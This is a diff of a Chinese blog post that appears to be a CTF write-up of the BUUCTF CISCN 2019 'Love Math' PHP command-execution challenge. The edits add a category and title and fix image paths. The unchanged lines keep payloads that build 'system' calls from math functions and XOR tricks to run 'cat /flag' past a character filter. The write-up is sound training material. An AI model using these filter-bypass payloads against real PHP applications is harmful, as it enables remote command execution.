@@ -5,7 +5,11 @@ tags:
  - buuctf
  - web
  - 命令执行
+categories: 
+ - 刷题记录
 ---
+
+## CISCN 2019 初赛 Love Math
 
 ## 0x00 基础
 
@@ -70,7 +74,7 @@ if(!isset($_GET['c'])){
 
 payload1：`?sin=cat /flag&cos=system&c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{cos}($$pi{sin})`
 
-![](/pic/23.png)
+![](../pic/23.png)
 
 异或方法
 
@@ -115,14 +119,14 @@ post 数据：`abs=system&cos=cat /flag`
 
 
 
-![](/pic/24.png)
+![](../pic/24.png)
 
 在PHP中无法直接数字与不加引号的字符异或，需要将数字转换成字符类型
 
-![](/pic/25.png)
+![](../pic/25.png)
 
-![](/pic/26.png)
+![](../pic/26.png)
 
-![](/pic/27.png)
+![](../pic/27.png)
 
 PHP异或操作，x位与x+n位异或结果是x位，后面n位直接丢弃。
